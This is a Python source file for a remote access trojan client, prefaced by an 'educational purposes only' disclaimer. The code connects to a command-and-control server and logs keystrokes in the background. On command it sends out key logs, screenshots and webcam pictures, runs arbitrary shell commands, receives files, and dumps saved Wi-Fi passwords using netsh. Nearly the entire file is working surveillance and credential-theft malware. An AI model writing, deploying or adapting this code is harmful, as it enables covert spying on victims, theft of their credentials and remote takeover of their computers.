'''
Disclaimer: This code and software are provided for educational purposes only. The author and contributors disclaim any responsibility for misuse, harm, or damage caused by the use of this code. Use at your own risk and responsibility. This code should not be used for any malicious or unauthorized activities.
'''
from PIL import ImageGrab
import socket
import os
import threading
import subprocess
import cv2
from pynput import keyboard
from cv2 import *
from cv2 import VideoCapture
from cv2 import imwrite
import time
import re

def get_wifi_profiles():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, shell=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")
        return ""

def extract_profile_names(output):
    profile_names = re.findall(r": (.*)", output)
    return profile_names

def get_wifi_password(profile_name):
    try:
        command = f'netsh wlan show profile name="{profile_name}" key=clear'
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        if result.returncode != 0:
            return None
        password = re.findall(r"Key Content\s*: (.*)", result.stdout)
        return password[0].strip() if password else None
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")
        return None

def enumerate_wifi_passwords():
    wifi_profiles = get_wifi_profiles()
    profile_names = extract_profile_names(wifi_profiles)

    wifi_passwords = {}
    for profile_name in profile_names:
        password = get_wifi_password(profile_name.strip())
        wifi_passwords[profile_name.strip()] = password

    return wifi_passwords

def take_screenshot():
    img = ImageGrab.grab()
    img.save("screenshot.png")

def take_webcam_picture():
    try:
        # Initialize the camera
        cam_port = 4
        cam = cv2.VideoCapture(cam_port)
        time.sleep(1)
        # Reading the input using the camera
        result, image = cam.read()

        # If image is detected without any error, save it
        if result:
            # Save the image to a file
            imwrite("webcam_picture.png", image)
            print("Webcam picture saved successfully.")
        else:
            print("No image detected. Please try again.")
        
        # Release the camera
        cam.release()
    except Exception as e:
        print(f"Error occurred - {e}")

def receive_file(client_socket, file_path):
    try:
        # Receive the file size from the server
        size_data = client_socket.recv(10).decode('utf-8')
        size = int(size_data)
        print(f"Receiving file data of size: {size}")

        received_data = b""
        while len(received_data) < size:
            data = client_socket.recv(size - len(received_data))
            if not data:
                break
            received_data += data

        if len(received_data) == size:
            print("File data received successfully.")
            with open(file_path, "wb") as f:
                f.write(received_data)
            print(f"File saved successfully to {file_path}.")
        else:
            print("Failed to receive complete file data.")
    except Exception as e:
        print(f"Error occurred while receiving file - {e}")

def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    return client_socket

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogs.txt", "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open("keylogs.txt", "a") as f:
                f.write("\n")

def main():
    host = '127.0.0.1'  # Replace with the IP address of your C2 server
    port = 1112         # Use the same port number as the C2 server

    # Create keylogs.txt if it doesn't exist
    if not os.path.exists("keylogs.txt"):
        with open("keylogs.txt", "w") as f:
            pass

    client_socket = connect_to_server(host, port)
    print(f"Connected to the server: {host}:{port}")

    # Start keylogger thread
    keylogger_thread = threading.Thread(target=keyboard.Listener(on_press=on_press).start)
    keylogger_thread.daemon = True  # Set the thread as daemon to run in the background
    keylogger_thread.start()

    try:
        while True:
            command = client_socket.recv(1024).decode().strip()

            if not command:
                continue

            print(f"Received command: {command}")

            if command == "screenshot":
                print("Taking screenshot...")
                take_screenshot()
                print("Sending screenshot data...")
                with open("screenshot.png", "rb") as f:
                    screenshot_data = f.read()
                    size = len(screenshot_data)
                    client_socket.sendall(bytes(str(size), 'utf-8'))
                    client_socket.sendall(screenshot_data)
                print("Screenshot data sent successfully.")
                os.remove("screenshot.png")  # Delete the screenshot after sending
            elif command == "cmd":
                cmd_command = client_socket.recv(1024).decode().strip()
                try:
                    output = subprocess.check_output(cmd_command, shell=True).decode('utf-8')
                    client_socket.sendall(bytes(output, 'utf-8'))
                except Exception as e:
                    client_socket.sendall(bytes(str(e), 'utf-8'))
            elif command == "logs":
                print("Sending key logs...")
                with open("keylogs.txt", "rb") as f:
                    logs_data = f.read()
                    size = len(logs_data)
                    client_socket.sendall(bytes(str(size), 'utf-8'))
                    client_socket.sendall(logs_data)
                print("Key logs sent successfully.")
                # Optional: Delete the keylogs file after sending
                os.remove("keylogs.txt")
            elif command == "webcam":
                print("Taking webcam picture...")
                take_webcam_picture()
                print("Sending webcam picture data...")
                with open("webcam_picture.png", "rb") as f:
                    webcam_data = f.read()
                    size = len(webcam_data)
                    client_socket.sendall(bytes(str(size), 'utf-8'))
                    client_socket.sendall(webcam_data)
                print("Webcam picture data sent successfully.")
                os.remove("webcam_picture.png")  # Delete the webcam picture after sending
            elif command.startswith("file"):
                try:
                    _, file_path = command.split()
                    print("Receiving file from server...")
                    receive_file(client_socket, file_path)
                except ValueError:
                    print("Please enter the file path after 'file' command.")
            elif command == "creds":
                wifi_passwords = enumerate_wifi_passwords()
                password_data = "\n".join([f"Wi-Fi Name: {profile_name}, Password: {password}" for profile_name, password in wifi_passwords.items()])
                client_socket.sendall(password_data.encode('utf-8'))
            elif command == "exit":
                break
            else:
                print("Invalid command.")

    except Exception as e:
        print(f"Error occurred - {e}")
    except (ConnectionResetError, KeyboardInterrupt):
        print("Disconnecting from the server.")
        client_socket.close()
        sys.exit(0)
    print("Connection closed.")
    client_socket.close()

if __name__ == "__main__":
    main()
